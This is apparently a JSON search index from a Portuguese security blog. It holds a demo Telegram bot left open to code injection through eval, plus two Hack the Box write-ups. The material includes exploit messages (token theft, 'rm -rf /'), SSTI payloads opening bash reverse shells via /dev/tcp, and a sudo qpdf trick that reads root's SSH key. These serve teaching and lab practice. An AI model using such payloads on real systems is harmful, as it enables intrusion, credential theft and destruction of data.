[{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/tags/appsec/","section":"Tags","summary":"","title":"Appsec"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/categories/appsec/","section":"Categories","summary":"","title":"AppSec"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/authors/guisso/","section":"Authors","summary":"","title":"Guisso"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/tags/injection/","section":"Tags","summary":"","title":"Injection"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/categories/injection/","section":"Categories","summary":"","title":"Injection"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/tags/owasp/","section":"Tags","summary":"","title":"Owasp"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/categories/owasp/","section":"Categories","summary":"","title":"OWASP"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/tags/pt-br/","section":"Tags","summary":"","title":"Pt-Br"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/tags/python/","section":"Tags","summary":"","title":"Python"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/categories/python/","section":"Categories","summary":"","title":"Python"},{"content":" Bot do Telegram com Vulnerabilidade de Injeção # Este projeto demonstra um bot simples do Telegram implementado em Python usando a biblioteca python-telegram-bot. O bot inclui uma vulnerabilidade na função echo, que avalia qualquer entrada de texto recebida, potencialmente levando a ataques de injeção de código.\nExecutando o Projeto # Siga estas etapas para executar o projeto localmente:\nClone o repositório:\ngit clone https://github.com/fguisso/python-injection Instale as dependências necessárias:\npip install python-telegram-bot Obtenha um Token de Bot do Telegram:\nInicie uma conversa com BotFather no Telegram. Você pode encontrá-lo pesquisando por \u0026ldquo;@BotFather\u0026rdquo; na barra de pesquisa do Telegram ou clicando aqui. Envie o comando /newbot para iniciar o processo de criação de um novo bot. Siga as instruções para escolher um nome e um username para o seu bot. Após criar o bot, o BotFather irá fornecer um token. Copie esse token. Defina o Token do Bot como uma Variável de Ambiente:\nexport TOKEN_TELEGRAM=\u0026#34;seu_token_do_bot_aqui\u0026#34; Execute o script Python:\npython main.py Interaja com o bot no Telegram.\nFuncionamento do Bot # O bot está configurado para receber mensagens contendo operações matemáticas como entrada. Essas operações são resolvidas no comando echo, que retorna o resultado da operação como resposta.\nPor exemplo, ao enviar a mensagem 2 + 2 para o bot, ele retornará 4. Isso pode ser útil para realizar cálculos simples diretamente no Telegram.\nExplicação da vulnerabilidade # As vulnerabilidades de injeção estão entre as principais preocupações de segurança de aplicativos da web. De acordo com o OWASP Top 10, a injeção de código (como SQL injection, XSS, Command Injection e outras) é uma das principais ameaças para a segurança dos aplicativos.\nNo contexto deste bot, a vulnerabilidade de injeção ocorre na função echo, que utiliza a função eval para evoluir qualquer entrada de texto recebida. Isso permite que possíveis atacantes executem código arbitrário enviando uma entrada maliciosa. Exploits são os códigos maliciosos usados para atacar o sistemas e neste cenario estes são alguns exemplos de exploits que você pode enviar para seu bot que serão executados na maquina onde o seu bot esta rodando:\nMensagem para o bot Resultado do exploit os.getenv(\u0026quot;TOKEN_TELEGRAM\u0026quot;) Acesso a variáveis de ambiente os.system(\u0026quot;rm -rf /\u0026quot;) Execução de comandos do sistema operacional, no caso, rm vai deletar todos os arquivos do sistema. import malicious_module Importação de módulos maliciosos __import__(\u0026quot;malicious_module\u0026quot;).malicious_function() Execução de código malicioso. Os usuários são encorajados a testar esses exploits em seu próprio bot e observar os resultados. No entanto, tenha cuidado ao usar exploits, pois eles podem causar danos ao sistema.\nDocumentação # python-telegram-bot Documentation Telegram Bot API Documentation Telegram BotFather Documentation OWASP Top 10 ","date":"23 March 2024","externalUrl":null,"permalink":"/posts/python-injection/","section":"Posts","summary":"Bot do Telegram com Vulnerabilidade de Injeção # Este projeto demonstra um bot simples do Telegram implementado em Python usando a biblioteca python-telegram-bot.","title":"Python Injection"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/","section":"Sunsec","summary":"","title":"Sunsec"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags"},{"content":"","date":"23 March 2024","externalUrl":null,"permalink":"/categories/telegram/","section":"Categories","summary":"","title":"Telegram"},{"content":"","date":"22 March 2024","externalUrl":null,"permalink":"/tags/ctf/","section":"Tags","summary":"","title":"CTF"},{"content":"","date":"22 March 2024","externalUrl":null,"permalink":"/tags/hack-the-box/","section":"Tags","summary":"","title":"Hack the Box"},{"content":" Reconhecimento # A princípio realizamos o mapeamento das portas abertas no nosso alvo, bem como seus serviços e versões.\nPORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.52 ((Ubuntu)) Ao tentar acessar o servidor WEB, nós somos redirecionados para o domínio capiclean.htb. Dessa forma, adicionamos a seguinte linha no nosso arquivo /etc/hosts para que esse domínio consiga ser resolvido.\necho \u0026#34;10.10.11.12 capiclean.htb\u0026#34; | sudo tee -a /etc/hosts Após acessar a aplicação e realizarmos uma busca na aplicação por vulnerabilidades, e nos deparamos com o endpoint \u0026ldquo; http://capiclean.htb/quote\" que trouxe uma mensagem suspeita:\nYour quote request was sent our management team. They will reach out soon via e-mail. Thanks for the interest you have shown in our services Ao ler esta mensagem, automaticamente verificamos se algum parâmetro da request enviada para o admin, vulnerável a XSS, pois se fosse o caso nós poderíamos fazer a exfiltração do seu token e utilizar a app com privilégio máximo.\nUtilizamos os payload acima para enviar o token de sessão do admin para um servidor web que que levantamos com python utilizando o comando\npython3 -m http.server Como resultado desse processo, obtivemos o token de sessão do admin Acesso inicial # De posse do token, enumeramos mais alguns endpoint da aplicação\nffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3- medium.txt:FFUZ -u http://capiclean.htb/FFUZ E encontramos o endpoint \u0026lsquo;dashboard\u0026rsquo; que tem acesso restrito. Dessa forma, adicionamos o cookie de admin no browser e conseguimos acessar o endpoint.\nSeguindo o \u0026lsquo;happy path\u0026rsquo; da aplicação nós geramos um invoice, e posteriormente tentamos acessá-lo por meio da função de geração de QRcode. Analisando os parâmetros request, nós identificamos um SSTI no parâmetro \u0026lsquo;qr_link\u0026rsquo;\nUma vez que identificamos esta vulnerabilidade, nós iniciamos os testes com payloads diversos para conseguir uma shell reversa. O payload a seguir foi o que nos possibilitou acessar o sistema\n{{request|attr(\u0026#34;application\u0026#34;)|attr(\u0026#34;\\x5f\\x5fglobals\\x5f\\x5f\u0026#34;)|attr(\u0026#34;\\x5f\\x5fgetitem\\x5f\\x5f\u0026#34;)(\u0026#34;\\x5f\\x5fbuiltins\\x5f\\x5f\u0026#34;)|attr(\u0026#34;\\x5f\\x5fgetitem\\x5f\\x5f\u0026#34;)(\u0026#34;\\x5f\\x5fimport\\x5f\\x5f\u0026#34;)(\u0026#34;os\u0026#34;)|attr(\u0026#34;popen\u0026#34;)(\u0026#34;bash -c \u0026#39;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/Nosso_IP/4444 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;)|attr(\u0026#34;read\u0026#34;)()}} Escalação de privilégio # Uma vez que conseguimos executar código na máquina alvo, realizamos uma varredura na em sua infraestrutura. Começamos pelo código fonte da aplicação. Nele encontramos algumas credenciais de banco de dados:\ndb_config = { \u0026#39;host\u0026#39;: \u0026#39;127.0.0.1\u0026#39;, \u0026#39;user\u0026#39;: \u0026#39;iclean\u0026#39;, \u0026#39;password\u0026#39;: \u0026#39;pxCsmnGLckUb\u0026#39;, \u0026#39;database\u0026#39;: \u0026#39;capiclean\u0026#39; } Ao verificarmos as portas abertas na aplicação, percebeu-se que a porta 3306 estava aberta. Indicando que existe um banco MySQL em execução. De posse dessa informação utilizamos as credenciais antes encontradas no código para assim consegui ter acesso aos dados do banco\nmysql --database capiclean -e \u0026#39;show databases;\u0026#39; -u iclean -p Após isso, tentamos quebrar ambas as hashs e tivemos sucesso em quebrar apenas a hash do usuário \u0026lsquo;consuela\u0026rsquo; que resultou na senha \u0026lsquo;simple and clean\u0026rsquo;. Com a senha e o usuário foi feita a tentativa de logins via ssh.\nssh consuela@$rhost Que foi bem sucedida. Agora com a shell ssh verificamos se algum comando habilitado a ser executado com privilégio de sudo.\nsudo -l Após entender do que se trata a plicação. Fizemos a seguinte suposição, se o usuário consuela tem ssh, o usuário root também deve ter ssh. Sendo sua chave privada armazenada no arquivo /root/.ssh/id_rsa, nós poderíamos mandar criar um pdf com o conteúdo da chave ssh do usuário root e direcionarmos esse pdf para um diretório acessível.\nsudo /usr/bin/qpdf --qdf --add-attachment /root/.ssh/id_rsa -- --empty ./id_rsa Após a suposição se mostrar verdadeira, nós resgatamos a chave ssh ao verificar o conteúdo interno do pdf, nós realizamos o login via root por meio do comando\nssh root@$rhost -i root_ssh_key_file Com isso nós temos acesso ao usuário root e podemos ver a última flag\ncat root.txt ","date":"22 March 2024","externalUrl":null,"permalink":"/posts/htb-iclean/","section":"Posts","summary":"Resolução da máquina perfection do hack the box","title":"Hack the Box - iclean"},{"content":" 1. Introdução # Coe, aqui estara a descrição dos passos que eu junto à galera da sunsec tomamos para resolver a máquina \u0026ldquo;Perfection\u0026rdquo; do hack the box. E que depois de muita luta (principalmente no bypass do SSTI) nós conseguimos ownar.\nReconhecimento # A princípio, utilizamos o nmap a fim de descobrir as portas sendo utilizadas e os serviços exploravei bem como suas versões\nnmap -sC -sV $target PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA) |_ 256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519) 80/tcp open http nginx |_http-title: Weighted Grade Calculator Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Após analisar o resultado do nmap, nos voltamos para a aplicação web na porta 80. Na qual seguimos mapeando, foi utilizado o wapplizer extrair informações sobre as tecnologias sendo utilizadas na página web e descobrimos que estão utilizando ruby na versão 3.0.2. Além disso, o site foi construido usando o WEBrick 1.7.0. Com tudo que foi recolhido, buscamos por exploits para explorar as versões das tanto do ruby quanto do WEBbrick mas não encontramos nada.\nContinuamos vasculhando à aplicação até esbarrar no seguinte formulário:\n[ ]\nSeguindo o caminho esperado pela aplicação, nós inserimos os dados necessários no formulário e obtivemos como resultado um cálculo de peso.\nYour total grade is 12% sample: 12% N/A: 0% N/A: 0% N/A: 0% N/A: 0% Dado este output, nós percebemos que os dados que nós inserimos estão sendo processados pelo backend da aplicação e está sendo devolvido para o frontend. Com isso em mente, tentamos inserir alguns payloads de XSS/SQLI/SSTI e obtivemos a seguinte a menssagem \u0026ldquo;Malicious input blocked\u0026rdquo; então decidimos investir nesse campo. Focamos nos payloads de SSTI por se tratar de uma app escrita em ruby e esta linguagem ter um péssimo histórico com templates.\nApós batermos cabeça por muito tempo usando vários payloads com os mais diversos encodes possíveis, utilizamos uma técnica de bypass por meio da quebra de linha com o seguinte payload:\nunencoded aa\\n\u0026lt;%= `ls /` %\u0026gt; encoded aa%0a\u0026lt;%25%3d+`ls+/`+%25\u0026gt; Feito isso, agora é possível executar comandos dentro da máquina alvo. Sendo assim tentamos pegamos uma shell reversa alterando o comando para:\nunencoded aa\\n\u0026lt;%= `bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.73/1337 0\u0026gt;\u0026amp;1` %\u0026gt; encoded aa\\n\u0026lt;%25%3d+`bash+-i+\u0026gt;%26+/dev/tcp/10.10.14.73/1337+0\u0026gt;%261`+%25\u0026gt; Agora dentro da máquina alvo fazemos o update da shell\npython3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; Vasculhando por informações, encontra-se no diretorio do usuário \u0026ldquo;susan\u0026rdquo; um sub-diretorio de migrations, e utilizando o comando strings nele algumas informação.\nCredenciais da sunsan De posse dessa credencial nós quebrabos a senha com hashcat e a utilizamos para logar como root e pegar a última flag.\n","date":"22 March 2024","externalUrl":null,"permalink":"/posts/htb-perfection/","section":"Posts","summary":"Resolução da máquina perfection do hack the box","title":"Hack the Box - Perfection"},{"content":"","date":"22 March 2024","externalUrl":null,"permalink":"/authors/paixao/","section":"Authors","summary":"","title":"Paixao"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series"}]